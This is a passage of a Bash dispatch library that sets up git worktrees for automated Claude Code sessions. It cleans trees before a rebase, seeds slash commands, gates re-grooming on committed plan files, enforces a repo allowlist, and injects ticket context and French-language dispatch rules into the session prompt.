# rebases it onto origin/main. `git rebase` refuses to run on a dirty tree
# (`error: cannot rebase: You have unstaged changes` → STATUS=REBASE_CONFLICT
# with `Rebase failure mode: other`, no real conflict), re-blocking the task
# with no recovery path (confirmed n=2 on 2026-06-05: mika#1255, mika#1381).
# This helper guarantees a clean tree before the rebase, in three tiers:
#
#   1. Abort any half-finished rebase left by a killed prior dispatch — a
#      rebase-in-progress state would make the stash below fail and re-trigger
#      the exact crash this fixes.
#   2. Surgically reset dispatch-lib-owned scaffold/ephemeral paths to HEAD.
#      These are re-copied / re-derived post-rebase anyway, so resetting them
#      costs nothing and keeps them out of the operator-recovery stash. The
#      `.claude/commands/` reset covers the dominant case: `make deploy` writing
#      a stale mika.md into worktree working trees (modified TRACKED file).
#      Subsumes the mika#1301 (.iterate/, groom-verdict-trail.log) and mika#1311
#      (docs/plans/) surgical resets that previously lived inline.
#   3. Blanket fallback: if any residue survives the surgical resets it is
#      genuinely unexpected (crash leftovers, new untracked files deploy added).
#      Stash it as a safety net — capturing the IMMUTABLE stash commit SHA and
#      logging a self-contained recovery command — then hard-reset + clean so
#      the rebase precondition holds. The stash is operator-recoverable via
#      `git -C <worktree> stash list` (its message embeds the task id +
#      timestamp) — this is the durable recovery path; the stderr echo is a
#      convenience and does NOT land in /var/log/claude-pilot/<id>.stderr (that
#      file captures only the later claude-pilot subprocess stderr). `clean -fd`
#      omits -x so it never deletes gitignored worktree state (.claude/*.local.json,
#      .claude/worktrees, scheduled_tasks.lock); the .claude config files are
#      re-copied from $PLATFORM_DIR post-rebase regardless.
#
# Args: $1 = worktree dir (defaults to $WORKTREE_DIR). Reads $LOG_ID for the
# stash label. Sets RESUME_CLEANUP_STASH to the stash SHA when one is created
# (empty otherwise). Returns 1 without touching anything if $wt is not a worktree.
_clean_worktree_for_rebase() {
    local wt="${1:-$WORKTREE_DIR}"
    RESUME_CLEANUP_STASH=""

    # Guard: refuse destructive cleanup on an invalid target. `git -C ""` silently
    # operates on the dispatch process CWD (a live checkout), so an empty/unset $wt
    # would point `reset --hard` / `clean -fd` at the wrong tree. Not reachable on
    # the live path (WORKTREE_DIR is always derived first) but the helper is a
    # sourceable, destructive primitive — fail closed.
    if [ -z "$wt" ] || ! git -C "$wt" rev-parse --is-inside-work-tree >/dev/null 2>&1; then
        echo "dispatch-lib: _clean_worktree_for_rebase got an invalid worktree ('${wt}'); refusing destructive cleanup" >&2
        return 1
    fi

    # Tier 1: abort any half-finished rebase (hardening). stdout is suppressed
    # along with stderr throughout — dispatch-lib reserves stdout for the RESULT
    # payload, and `reset --hard` / `clean -fd` below print to stdout.
    git -C "$wt" rebase --abort >/dev/null 2>&1 || true

    # Tier 2: surgical resets of dispatch-lib-owned scaffold/ephemeral paths.
    #
    # mika#2157 (R3): the four resets below are one of the two authorities
    # `_rescue_diff_carries_work` transcribes into its incident-artefact list —
    # the other being the rescue commit's `git add -A` scaffold exclusions. They
    # are NOT merged: this one resets, that one classifies, and a shared
    # abstraction over two different semantics would cost more than a handful of
    # duplicated patterns. They can drift; when you add a path here, add it to
    # the classifier too (and give it a symmetric test).
    git -C "$wt" checkout -- .claude/groom-verdict-trail.log 2>/dev/null || true
    # mika#1943: `$wt` a déjà prouvé qu'il est un dépôt git (garde en tête de
    # fonction), jamais qu'il est un worktree GÉRÉ — et c'est la seconde moitié
    # qui manquait. Sur refus on saute ce reset chirurgical : le tier 3
    # ci-dessous (stash + reset) ramasse le résidu, donc le coût est borné.
    if _assert_removable_worktree_path "$wt" clean_worktree_for_rebase; then
        rm -rf "$wt/.iterate" 2>/dev/null || true
    fi
    git -C "$wt" checkout HEAD -- docs/plans/ 2>/dev/null || true
    git -C "$wt" checkout HEAD -- .claude/commands/ 2>/dev/null || true

    # Tier 3: blanket fallback for genuinely-unexpected residue.
    if [ -n "$(git -C "$wt" status --porcelain 2>/dev/null)" ]; then
        local stash_msg
        stash_msg="dispatch-lib-resume-cleanup-${LOG_ID:-unknown}-$(date -u +%Y%m%dT%H%M%SZ)"
        if git -C "$wt" stash push --include-untracked -m "$stash_msg" >/dev/null 2>&1; then
            # Capture the IMMUTABLE stash commit SHA — stash@{0} shifts as other
            # worktrees push/pop on the shared stash stack. Use `--verify --quiet`:
            # plain `rev-parse 'stash@{0}'` on a missing ref exits non-zero but
            # echoes the literal string "stash@{0}" to stdout, which `|| true`
            # would capture as a bogus handle when `stash push` reported success
            # yet created no entry (e.g. nothing actually stashable). --verify
            # --quiet prints nothing and exits non-zero in that case → empty.
            RESUME_CLEANUP_STASH=$(git -C "$wt" rev-parse --verify --quiet 'stash@{0}' 2>/dev/null || true)
            echo "dispatch-lib: resume-cleanup stashed dirty worktree before rebase → stash ${RESUME_CLEANUP_STASH:-<unknown>} (msg: ${stash_msg}); recover with: git -C ${wt} stash apply ${RESUME_CLEANUP_STASH:-<sha>}" >&2
        else
            echo "dispatch-lib: resume-cleanup found nothing to stash or stash errored; proceeding with hard reset" >&2
        fi
        # Belt-and-suspenders: ensure a clean tree even if the stash captured
        # nothing (e.g. unmerged paths). No -x, so gitignored config survives.
        git -C "$wt" reset --hard HEAD >/dev/null 2>&1 || true
        git -C "$wt" clean -fd >/dev/null 2>&1 || true
    fi
}

# Seed the worktree's .claude/commands/ with the meta-repo orchestration slash
# commands the inner Claude Code session may invoke (/mika-groom-ticket,
# /mika-revise-plan, etc.). The pilot runs with `--cwd "$WORKTREE_DIR"`, and
# Claude Code discovers project commands from <cwd>/.claude/commands/, so those
# commands must physically exist there or they arrive as raw text and the LLM
# improvises (mika#1173).
#
# The naive `cp -r "$PLATFORM_DIR/.claude/commands" "$WORKTREE_DIR/.claude/"`
# this replaces caused two regressions (mika#1415), both enforced against here:
#
#   1. NEVER overwrite a command the worktree's branch already tracks. The mika
#      sub-repo ships its OWN polymorphic /mika (mika#1255) and sub-repo-scoped
#      /mika-issue; the blanket copy clobbered them back to the 260-line
#      meta-repo dispatcher — re-creating the exact pre-#1255 recursion bug on
#      every dispatch. The worktree's tracked version always wins.
#
#   2. Copied meta-only commands MUST NOT dirty `git status`. They are ephemeral
#      dispatch scaffold (dispatch-lib already excludes .claude/commands/ from
#      its rescue `git add` — mika#1288); left visible they appear as ~18
#      untracked files that break the resume rebase ("cannot rebase: You have
#      unstaged changes") — the dirty-worktree class mika#1414 defends against.
#      We shield them via the worktree's shared info/exclude so the tree stays
#      clean at the source. (Verified: the per-worktree $GIT_DIR/info/exclude is
#      NOT honored for status; the common-dir info/exclude is.)
#
# Boundary (mika#1414 coordination): this helper owns ONLY the post-rebase
# command-seed. The pre-rebase dirty-state cleanup + rebase guard (the mika#1301
# block inside _set_up_worktree) is mika#1414's surface; the two do not overlap.
_seed_worktree_slash_commands() {
    local platform_dir=$1 worktree_dir=$2
    [ -d "$platform_dir/.claude/commands" ] || return 0
    mkdir -p "$worktree_dir/.claude/commands"

    # Shared exclude lives in the common git dir (a linked worktree's own
    # $GIT_DIR/info/exclude is not consulted for status). --path-format=absolute
    # needs git >= 2.31; fall back to the bare form otherwise.
    local common_dir exclude_file=""
    common_dir=$(git -C "$worktree_dir" rev-parse --path-format=absolute --git-common-dir 2>/dev/null) \
        || common_dir=$(git -C "$worktree_dir" rev-parse --git-common-dir 2>/dev/null)
    if [ -n "$common_dir" ]; then
        exclude_file="$common_dir/info/exclude"
        mkdir -p "$(dirname "$exclude_file")"
    fi

    local src base
    for src in "$platform_dir/.claude/commands"/*.md; do
        [ -e "$src" ] || continue
        base=$(basename "$src")
        # Invariant 1: the worktree's own tracked command wins — skip the copy.
        # Name-based: today only /mika, /mika-issue, /mika-issues collide, and
        # the sub-repo version is correct for all three. If a sub-repo ever
        # tracks a meta-ONLY orchestration command name (e.g. mika-groom-ticket.md)
        # this would silently shadow it (a mika#1173 risk) — revisit with an
        # explicit must-seed set if that case ever arises.
        if git -C "$worktree_dir" ls-files --error-unmatch ".claude/commands/$base" >/dev/null 2>&1; then
            continue
        fi
        cp "$src" "$worktree_dir/.claude/commands/$base" 2>/dev/null || true
        # Invariant 2: shield the scaffold copy from git status (idempotent).
        # Concurrent dispatches off the same sub-repo share this exclude file;
        # the grep/append is non-atomic, so an overlap may append a duplicate
        # (inert — git collapses repeated patterns) but never corrupts shielding.
        # flock was judged not worth the complexity (P3).
        if [ -n "$exclude_file" ] && ! grep -qxF ".claude/commands/$base" "$exclude_file" 2>/dev/null; then
            # Guard a pre-existing exclude file with no trailing newline, which
            # would otherwise concatenate our entry onto its last line.
            if [ -s "$exclude_file" ] && [ -n "$(tail -c1 "$exclude_file" 2>/dev/null)" ]; then
                printf '\n' >> "$exclude_file"
            fi
            printf '%s\n' ".claude/commands/$base" >> "$exclude_file"
        fi
    done
}

# Set up a git worktree for the target issue's branch. Parses the repo#number
# prompt format, derives branch name and canonical worktree path, creates or
# reuses the worktree, rebases onto origin/main, and seeds slash commands.
#
# Pre-flight cleanup (mika#1472): before creating a new worktree, detects if the
# target branch is already checked out at a non-canonical path (e.g. a slashed-path
# relic from before the derive-worktree-path invariant). Stashes any dirty state
# with a descriptive name (mirroring _clean_worktree_for_rebase's discipline from
# mika#1414) and removes the relic so the worktree add can succeed on the canonical
# dashed-slug path.
#
# Dual-failure diagnostic (mika#1472): when both worktree add attempts fail, emits
# a structured worktree_setup_failed: line to stderr with per-attempt error text,
# replacing the previous silent exit-128 trap. This is the fifth dispatch-lib
# silent-failure defense — siblings: mika#1364 (force-with-lease gap), #1407
# (stale-main mis-diagnosis), #1414 (dirty-worktree on resume), #1415 (worktree-
# setup clobbers .claude/commands).
# Evidence step for the redundant-groom refusal gate (mika#2012).
#
# Prints the plan path and returns 0 ONLY when the issue body carries a canonical
# Plan callout AND that file is actually committed on the dispatch branch.
# Returns 1 in every other case.
#
# The file check — not the body grep — is the entire point. A body-only test
# would refuse grooming for a ticket whose plan was never pushed, was deleted, or
# whose path drifted, stranding it forever. That is a strictly worse failure than
# the loop this gate closes: the loop wastes dispatches, a stranded ticket is
# never worked at all. When in doubt, this function returns 1 and grooming runs.
#
# _plan_provenance — did this branch commit the plan, or inherit it from main?
#
# mika#2034. A separate function on purpose: every caller of
# `_committed_plan_on_branch` invokes it in a command substitution, and a
# subshell cannot set a variable in its parent — the trap this file already
# documents for `_DISPOSITION_FUZZY`. A global set inside the gate would read
# back empty at exactly the site that needs it, so the measurement is a value
# the caller asks for by name instead.
#
# Describes, never decides. Deliberately NOT a gate condition: a ticket that was
# legitimately groomed and whose PR merged also carries its plan on `main`, so
# blocking on inheritance would re-strand the tickets the gate exists to protect
# (KTD1). Its only job is to stop the caller claiming the branch committed
# something it inherited.
#
# Args: $1 = sub-repo dir, $2 = branch, $3 = plan path (repo-relative).
_plan_provenance() {
    local sub_repo_dir="$1" branch="$2" candidate="$3"
    local gate_ref="refs/dispatch-gate/${branch}" branch_blob main_blob

    branch_blob=$(git -C "$sub_repo_dir" rev-parse "${gate_ref}:${candidate}" 2>/dev/null)
    main_blob=$(git -C "$sub_repo_dir" rev-parse "origin/main:${candidate}" 2>/dev/null)

    if [ -z "$branch_blob" ]; then
        # The ref is gone or the path no longer resolves. Say that, rather than
        # pick one of the two claims at random.
        printf 'provenance unmeasured — the plan no longer resolves on %s' "$gate_ref"
    elif [ "$branch_blob" = "$main_blob" ]; then
        printf 'inherited unchanged from main, not committed on this branch'
    else
        printf 'committed on the dispatch branch'
    fi
}

# mika#2034 — the path comes out of the ticket's OWN callout, so resolving it is
# not yet evidence about this ticket. Every dispatch branch descends from `main`
# and `main` carries 769 plan files, so any valid plan path resolves whatever
# ticket it belongs to: the attestation was being produced by the very claim it
# is supposed to check, against a tree that cannot refute it. Measured
# 2026-08-30, both stranded — the gate refused their grooming permanently:
#
#   mika#1887 → `…-fix-1933-reader-completed-section-avancement-plan.md`
#               whose header reads `issue: senara-solutions/mika#1933`
#   mika#2026 → `…-chore-deps-bump-rand-clear-rustsec-2026-0097-plan.md`
#               whose header reads `**Issue:** #539`
#
# Both files sit on `origin/main`; those branches inherited them and committed
# nothing. So the candidate is now bound to the issue before it is believed, and
# provenance is measured before it is described. Same class as mika#2028's
# fourth false statement, a different site — #2028 fixed the failure callback's
# guard, never this one.
_committed_plan_on_branch() {
    local sub_repo_dir="$1" branch="$2" issue_body="$3" repo="$4"
    # mika#2034: the target issue, optional and defaulted, so the four existing
    # call sites and the five fixture cases keep working unchanged (KTD2). When
    # neither is available the binding check is skipped rather than guessed —
    # refute on evidence, never on absence (KTD3).
    local issue_num="${5:-${ISSUE_NUM:-}}"
    local plan_path candidate

    plan_path=$(printf '%s\n' "$issue_body" \
        | sed -n 's/^> - \*\*Plan:\*\* *`\([^`]*\)`.*/\1/p' | head -1)
    [ -n "$plan_path" ] || return 1

    # Fetch the dispatch branch into a BRANCH-NAMED ref, never FETCH_HEAD.
    #
    # FETCH_HEAD is a single file in $GIT_DIR shared by every process touching
    # this checkout. mika#1001 allows one `implement` and one `groom` dispatch to
    # run concurrently per agent against the same sub-repo, so a sibling fetch
    # can overwrite FETCH_HEAD between our fetch and our cat-file. We would then
    # test the plan against the WRONG branch's tree — and the dangerous direction
    # is the false positive: refusing a legitimate grooming because some other
    # branch happens to carry a file at that path strands the ticket entirely.
    # A ref keyed on the branch name is deterministic; two dispatches on the same
    # branch write the same ref with the same content, which is benign.
    #
    # A branch that does not exist on the remote cannot carry a committed plan —
    # grooming is legitimate, so return 1.
    local gate_ref="refs/dispatch-gate/${branch}"
    git -C "$sub_repo_dir" fetch --quiet --force origin \
        "refs/heads/${branch}:${gate_ref}" 2>/dev/null || return 1

    # The callout carries two historical shapes: repo-prefixed
    # (`mika/docs/plans/…`) and repo-relative (`docs/plans/…`). Try both — U3
    # normalizes new writes, but tickets groomed before it keep the old form.
    local tmp_plan claimed
    for candidate in "$plan_path" "${plan_path#"${repo}/"}"; do
        # `cat-file -e` answers "does this path resolve", which a DIRECTORY also
        # satisfies — and `git show` on a tree prints a listing, so a callout
        # naming `docs/plans` would have been read as a plan with no issue
        # header and fired the gate. Demand a blob (mika#2034, found by the
        # unbindable-candidate test below).
        [ "$(git -C "$sub_repo_dir" cat-file -t "${gate_ref}:${candidate}" 2>/dev/null)" = "blob" ] || continue

        # --- Issue binding (mika#2034). The gate decision. ---
        #
        # `_plan_header_refutes_issue` takes a readable path and the candidate
        # lives in a git object, so materialize it (KTD4). Its contract is
        # refutation, not confirmation, and it is reused verbatim: a header that
        # claims nothing does NOT refute. 95 of the 745 plans in docs/plans/
        # carry no issue marker, and demanding a positive match would strand
        # every one of them — the false-negative class mika#1421, #1602 and
        # #1617 were each opened to close.
        # When the binding cannot be PERFORMED — mktemp fails, `git show` cannot
        # write the blob — the check must not be silently skipped. Skipping it
        # fires the gate on an unbound candidate, which is the defect this whole
        # change exists to close, arrived at by a different road. Decline
        # instead: an extra grooming costs one dispatch, a strand costs the
        # ticket. That is this function's stated doctrine ("when in doubt,
        # returns 1 and grooming runs"), applied to its own failure modes.
        if [ -n "$issue_num" ]; then
            tmp_plan=$(mktemp -t mika-gate-plan-XXXXXX.md 2>/dev/null) || {
                echo "dispatch_gate_groom_bind_unavailable: repo=${repo} issue=${issue_num} branch=${branch} plan=${candidate} — mktemp failed, cannot bind the plan to the issue; declining rather than firing on an unbound candidate (mika#2034)" >&2
                return 1
            }
            if ! git -C "$sub_repo_dir" show "${gate_ref}:${candidate}" > "$tmp_plan" 2>/dev/null \
               || [ ! -s "$tmp_plan" ]; then
                echo "dispatch_gate_groom_bind_unavailable: repo=${repo} issue=${issue_num} branch=${branch} plan=${candidate} — could not read the plan blob from ${gate_ref}, cannot bind it to the issue; declining rather than firing on an unbound candidate (mika#2034)" >&2
                rm -f "$tmp_plan"
                return 1
            fi
            if _plan_header_refutes_issue "$tmp_plan" "$issue_num"; then
                claimed=$(_plan_header_claimed_issues "$tmp_plan" | tr '\n' ' ')
                echo "dispatch_gate_groom_plan_refuted: repo=${repo} issue=${issue_num} branch=${branch} plan=${candidate} — the plan's own header claims issue ${claimed% }, not ${issue_num}; the body callout names a plan belonging to another ticket, so this ticket is NOT groomed and grooming proceeds (mika#2034)" >&2
                rm -f "$tmp_plan"
                return 1
            fi
            rm -f "$tmp_plan"
        fi

        # Provenance is NOT measured here: this function runs inside a command
        # substitution at every call site, so it must keep stdout to the plan
        # path alone. Callers that describe the plan ask `_plan_provenance` for
        # it by name.
        printf '%s' "$candidate"
        return 0
    done
    return 1
}

# --- Dispatchable-repo allowlist: shell defense in depth (mika#2062) ---
#
# Shell mirror of DISPATCHABLE_REPOS in
# crates/mika-agent/src/webhook_dispatch.rs. That Rust constant plus the
# tool-boundary guard in crates/mika-agent/src/skills/executor.rs (mika#2046)
# are the load-bearing layer: on the nominal loop path a non-allowlisted repo is
# refused before run_claude_pilot ever runs, so _set_up_worktree is not reached
# there. But dispatch-lib.sh is ALSO invoked outside the engine — manual runs,
# scripts, recovery paths — none of which pass through that Rust guard. This is
# the shell layer for those callers: it fails closed on any non-allowlisted repo
# (mika#2046 KTD5, deliberately deferred out of #2046's Rust suite).
#
# The list is duplicated across two languages by necessity: the Rust side is a
# compile-time `&[&str]`, not a runtime-readable data file the shell could
# source. test-dispatch-lib.sh parses the Rust source and FAILS if the two lists
# diverge — two mute copies are exactly the drift webhook_dispatch.rs exists to
# prevent (mika#1053 doctrine).
#
# Bare basenames only: _set_up_worktree strips any owner/ prefix and hardcodes
# the senara-solutions owner on every gh call, so the owner is never
# caller-controlled at the point this is checked.
DISPATCHABLE_REPO_BASENAMES=(mika mika-cloud mika-skills mika-platform)

# _is_dispatchable_repo <repo> — return 0 if <repo> is an allowlisted basename,
# 1 otherwise. Pure predicate: no output, no exit; the caller decides how to
# fail so the same check is reusable from tests without side effects.
_is_dispatchable_repo() {
    local candidate="$1" repo
    [ -n "$candidate" ] || return 1
    for repo in "${DISPATCHABLE_REPO_BASENAMES[@]}"; do
        [ "$candidate" = "$repo" ] && return 0
    done
    return 1
}

# mika#2211 — the PR-body containment rule, carried in every dispatch prompt.
#
# The failure it closes, measured: a pilot composing a long PR body reaches for
# `--body-file /tmp/pr-body-<N>.md` on its own (no prompt ever asked for it), the
# claude-pilot permission policy refuses every write outside the worktree
# (`[policy:deny] Write: /tmp/pr-body-2195.md`), `gh pr create --body-file` finds
# no file, and the session ends by ASKING the operator to paste the body — a
# dispatched session that asks a question is dead. Zero PR, then the mika#1282
# dirty-worktree recovery opens a `wip-rescue` draft instead. PRs #2202 and #2210
# both landed that way from this one cause.
#
# It states the positive form FIRST: a pilot told only "not /tmp" still has to
# invent a replacement, and the one it reaches for next
# (`--body-file - <<'BODY'`) breaks on a body that contains its own delimiter
# line — which a generated PR body, full of fenced blocks and headings, can.
# A file under the worktree is insensitive to the body's content.
#
# Kept to a few lines on purpose: it rides at the END of a prompt that already
# carries up to 16 KiB of ticket context, and recency is the only leverage it has.
_PR_BODY_CONTAINMENT_RULE="RÈGLE DE DISPATCH (mika#2211) — le corps de PR ne s'écrit JAMAIS hors du worktree.
Pour ouvrir la PR : écris le corps dans un fichier SOUS le worktree (\`pr-body.md\` à sa racine),
passe-le en \`--body-file pr-body.md\`, puis supprime-le. Un corps court peut rester en \`--body\` inline.
N'écris jamais dans \`/tmp\` : la permission-policy refuse toute écriture hors worktree
(\`[policy:deny] Write: /tmp/pr-body-<N>.md\`), \`gh pr create --body-file\` ne trouve alors aucun fichier,
et la session se termine sans PR. N'utilise pas non plus de heredoc \`<<'BODY'\` : un corps généré peut
contenir la ligne délimitrice et le terminer trop tôt. Ne demande jamais à l'opérateur de coller le corps
— une session dispatchée qui pose une question est une session morte."

# mika#2306 — la prescription `## Fire-Disposition`, portée par chaque dispatch
# de grooming.
#
# Le défaut qu'elle ferme : `/ce:plan` est un plugin tiers
# (`compound-engineering`) qui n'a aucune connaissance de mika#1574, donc un plan
# neuf livrant un détecteur arrive devant mika-arch sans la section que son
# Fire-Disposition Gate exige. L'architecte rend alors ITERATE — à juste titre —
# et l'unique itération de `_iterate_groom_loop` est dépensée sur un motif
# purement formel, évitable en amont. Au second passage le gate est sans recours
# (« No ITERATE exists at second pass per the two-pass limit »), donc le ticket
# ESCALATE et la boucle ne dispatche jamais l'implémentation.
#
# C'est exactement la configuration que le Acceptance-Criteria Gate décrit déjà
# mot pour mot pour sa section sœur : « Grooming is the surface we control
# between the third-party producer and our validator. » `## Acceptance criteria`
# a reçu ce traitement (mika#1600/#1627) ; `## Fire-Disposition` ne l'avait
# jamais reçu.
#
# La règle vit ICI et non dans `.claude/commands/mika-groom-plan-only.md` pour la
# même raison que `_PR_BODY_CONTAINMENT_RULE` ci-dessus : les trois commandes de
# groom vivent dans `senara-solutions/mika-platform` et sont semées dans le
# worktree par `_seed_worktree_slash_commands` (mika#1415), donc un ticket ouvert
# sur `senara-solutions/mika` ne peut pas les éditer. Ce PROMPT est le seul canal
# que ce dépôt contrôle. La moitié commandes est nommée en suivi, pas simulée.
#
# Ce n'est pas le prompt-enforcement que
# `feedback_prompt_enforcement_empirically_confirmed_at_loop_substrate` condamne :
# la leçon de mika#2120 porte sur une consigne qui dépend qu'un opérateur pense à
# la taper. Une constante injectée par le substrat à chaque dispatch ne dépend
# d'aucune mémoire — et la moitié structurelle est livrée à côté (le rattrapage
# de `_launch_revise_pilot`), ce que cette doctrine prescrit justement.
#
# Elle cite mika#1574 par référence et nomme ses trois options ; elle ne
# reformule pas la doctrine, pour que les deux ne puissent pas diverger.
_FIRE_DISPOSITION_RULE="RÈGLE DE GROOMING (mika#2306) — un plan qui livre un détecteur porte \`## Fire-Disposition\`.
Détecteur = tout livrable dont la fonction primaire est de signaler une violation : test,
assertion, règle de lint, garde CI, validateur de schéma, scan structurel, garde EndTurn —
tout code dont le chemin de succès est « aucune violation trouvée ».
Si le plan en livre au moins un, il DOIT porter une section \`## Fire-Disposition\` nommant
l'une des trois options canoniques de mika#1574, avec son détail d'implémentation :
(a) exception nommée en allowlist (défaut) — chaque violation existante reçoit une entrée
    grep-visible qui nomme la donnée précise, référence un ticket de suivi, et porte une
    assertion auto-nettoyante qui rougit quand l'exception devient stale ;
(b) livrer désarmé — le détecteur atterrit avec \`#[ignore]\` / \`#[cfg(skip)]\` ou équivalent,
    plus un suivi tracké pour l'armer ;
(c) halte-et-remontée — l'implémentation s'arrête et remonte à l'opérateur pour cadrage.
Si le plan ne livre AUCUN détecteur, la section n'est pas requise (gate N/A) : ne l'invente pas.
Sans elle, mika-arch rend ITERATE en première passe et ESCALATE en seconde — et la seconde
passe est sans recours."

# mika#2178 — render the ticket text (body AND comments) in a form that can be
# injected into the pilot's opening prompt.
#
# The defect this repairs: `PROMPT` was exactly `<repo>#<num>`, and claude-pilot
# builds its opening prompt by plain concatenation, `f"{ns.command} {opening}"`
# (claude_pilot/cli.py:290 interactive, :251 headless). On the plan-callout path
# — the one every groomed ticket takes — the pilot's real input was therefore
# `/ce-work docs/plans/x.md mika#N`: no body, no comments. The seven readers of
# the issue-body variable are all internal to this file (branch derivation,
# anti-re-groom gate, callout detection, rescue) and none of them writes into
# the prompt, so widening the fetch alone would fill a variable nobody forwards.
#
# Contract: reads the issue JSON on stdin, writes the rendered block on stdout,
# returns the EMPTY STRING when there is neither a body nor a comment to render.
# Reads no global and opens no network round trip — the JSON is handed to it,
# which is what keeps it testable with no token and no network.
_render_ticket_context() {
    local repo="$1" issue_num="$2"

    # --- Volume bounds. Each value is a measurement, not a preference. ---
    #
    # body 16 KiB: measured groomed bodies run 3–8 KiB, so truncation stays rare
    #   while the worst case stays bounded.
    # 10 comments: a trajectory correction is recent by construction — it reacts
    #   to a dead dispatch. "Posterior to the last grooming callout" was rejected
    #   as a rule: the body callout carries no date, so "posterior" is not
    #   computable from the body. The comment stream is the only dated surface.
    # 4 KiB per comment: the ceiling ITERATION_CTX already applies below
    #   (`head -c 4096`). This file keeps ONE convention, not two.
    # 16 KiB for the comment block: ten comments at 4 KiB would be 40 KiB; the
    #   block cap makes the worst case deterministic (≤ 32 KiB of total context
    #   with the body). Eviction starts at the oldest because the most recent
    #   comment is the one most likely to carry the correction.
    #
    # Every omission is ANNOUNCED. A silently amputated context is the defect
    # this repairs, not one it is allowed to reintroduce.
    local body_max=16384
    local comment_max=4096
    local block_max=16384
    local keep_max=10

    # Byte-exact slicing WITHOUT a pipe, deliberately.
    #
    # `printf '%s' "$x" | head -c N` is the obvious spelling — it is the one
    # ITERATION_CTX uses below — but it kills its writer with SIGPIPE as soon as
    # the payload exceeds the pipe buffer (64 KiB on Linux): head exits after N
    # bytes while printf is still writing. Under this file's `set -euo pipefail`
    # that becomes a failed command substitution and aborts the WHOLE dispatch.
    # A GitHub issue body caps at 65 536 CHARACTERS, hence well past 64 KiB in
    # UTF-8: the case is reachable on a real maximal ticket, not theoretical
    # (same class as mika#2055).
    #
    # `LC_ALL=C` is what makes `${var:0:n}` count OCTETS, so the bounds above
    # mean what their marker text says. It is function-local and NOT exported:
    # the child processes below keep the ambient locale.
    #
    # Consequence accepted, exactly as with `head -c`: a cut can land mid-UTF-8.
    # The marker follows immediately, so the seam is announced, never silent.
    local LC_ALL=C

    local issue_json
    issue_json=$(cat)
    [ -n "$issue_json" ] || return 0

    local body total rows
    body=$(printf '%s' "$issue_json" | jq -r '.body // ""' 2>/dev/null) || return 0
    total=$(printf '%s' "$issue_json" | jq -r '(.comments // []) | length' 2>/dev/null) || total=0
    [ -n "$total" ] || total=0

    # One TSV row per retained comment, oldest first:
    #   <1-based index in the FULL list> <login> <createdAt> <base64(body)>
    # The index stays the one from the full list so that "6/15" and the omission
    # line tell the same story. The body travels base64-encoded: a comment
    # routinely contains newlines and ``` fences that would break any naive
    # encoding.
    rows=$(printf '%s' "$issue_json" | jq -r --argjson keep "$keep_max" '
        (.comments // []) as $c
        | ($c | length) as $n
        | (if $n > $keep then $n - $keep else 0 end) as $skip
        | $c[$skip:]
        | to_entries[]
        | [ ($skip + .key + 1 | tostring),
            (.value.author.login // "inconnu"),
            (.value.createdAt // ""),
            ((.value.body // "") | @base64) ]
        | @tsv
    ' 2>/dev/null) || rows=""

    local -a blocks=()
    local idx login created b64 cbody role block
    while IFS=$'\t' read -r idx login created b64; do
        [ -n "$idx" ] || continue
        cbody=$(printf '%s' "$b64" | base64 -d 2>/dev/null) || cbody=""
        if [ "${#cbody}" -gt "$comment_max" ]; then
            cbody="${cbody:0:$comment_max}
[… tronqué à ${comment_max} o]"
        fi
        # Role by login. A QA `block[pipeline]` verdict posted by a bot and an
        # operator instruction posted by a human must not read the same; the
        # author is the only discriminant available without heuristics on the
        # text itself.
        case "$login" in
            mika-platform-dev|github-actions|*'[bot]') role="bot" ;;
            *) role="humain" ;;
        esac
        # Plain `---` separators, never a code fence: a comment routinely
        # contains ``` fences that would break any nesting.
        block=$(printf -- '--- commentaire %s/%s · %s (%s) · %s ---\n%s' \
            "$idx" "$total" "$login" "$role" "$created" "$cbody")
        blocks+=("$block")
    done <<<"$rows"

    # Block cap: evict the oldest first.
    local block_text=""
    while [ "${#blocks[@]}" -gt 0 ]; do
        block_text=$(printf '%s\n\n' "${blocks[@]}")
        [ "${#block_text}" -le "$block_max" ] && break
        blocks=("${blocks[@]:1}")
        block_text=""
    done

    if [ "${#body}" -gt "$body_max" ]; then
        body="${body:0:$body_max}
[… corps tronqué à ${body_max} o]"
    fi

    # Nothing to render: empty string, so the caller leaves PROMPT untouched.
    [ -n "$body" ] || [ "${#blocks[@]}" -gt 0 ] || return 0

    # The header says WHAT TO DO with the block, not merely that the text
    # exists. A block labelled "context" with no reading instruction reads like
    # archive noise — the precedent is `ITERATION CONTEXT` below, which names
    # its own use. The rendered strings are French on purpose: they are content
    # addressed to the pilot, alongside a French ticket body and French operator
    # comments, not code commentary.
    printf '%s\n' \
        "CONTEXTE DU TICKET (senara-solutions/${repo}#${issue_num})" \
        "Le corps et les commentaires ci-dessous FONT PARTIE du ticket. Une consigne" \
        "opérateur, une correction de trajectoire ou un enrichissement de grooming y vit" \
        "aussi souvent dans un commentaire que dans le corps. Lis les deux avant d'agir." \
        ""

    if [ -n "$body" ]; then
        printf -- '--- corps du ticket ---\n%s\n\n' "$body"
    fi

    local omitted=$((total - ${#blocks[@]}))
    if [ "$omitted" -gt 0 ]; then
        printf '[%s commentaire(s) plus ancien(s) omis]\n\n' "$omitted"
    fi

    if [ -n "$block_text" ]; then
        printf '%s' "$block_text"
    fi
}

_set_up_worktree() {
    # --- Parse repo#number format ---
    # Matches: mika#214, mika-skills#8, mika-cloud#50, and an optional owner/
    # prefix (senara-solutions/mika#214). The owner prefix is stripped so REPO
    # is always the bare basename — dispatch-lib hardcodes the senara-solutions
    # owner for the gh call below. Normalizing here means an owner-qualified ref
    # is routed into worktree mode instead of silently falling through to
    # free-text mode (mika#1593). The match stays fully anchored, so genuine
    # free-text prompts with an embedded '#' still fall through as before.
    REPO=""
    ISSUE_NUM=""
    if grep -qE -- '^([a-zA-Z0-9_-]+/)?[a-zA-Z0-9_-]+#[0-9]+$' <<<"$PROMPT"; then
        REPO=$(printf '%s' "$PROMPT" | sed 's/#.*//' | sed 's#.*/##')
        ISSUE_NUM=$(printf '%s' "$PROMPT" | sed 's/.*#//')
    fi

    if [ -n "$REPO" ] && [ -n "$ISSUE_NUM" ]; then
        # --- repo#number mode: derive everything from the issue ---
        LOG_ID="$TASK_ID"

        # Defense-in-depth allowlist gate (mika#2062, follow-up of #2046).
        # Runs BEFORE SUB_REPO_DIR is resolved: the bare `.git` presence test
        # below would otherwise wave through any co-located checkout (e.g.
        # control-monitor, claude-pilot — spawn-CC-only per the 2026-08-29
        # operator decision), since those repos exist in the same workspace.
        # Fail closed, loudly and named, with the repo in a machine-readable
        # field, mirroring `repo_not_dispatchable` on the Rust side. This is a
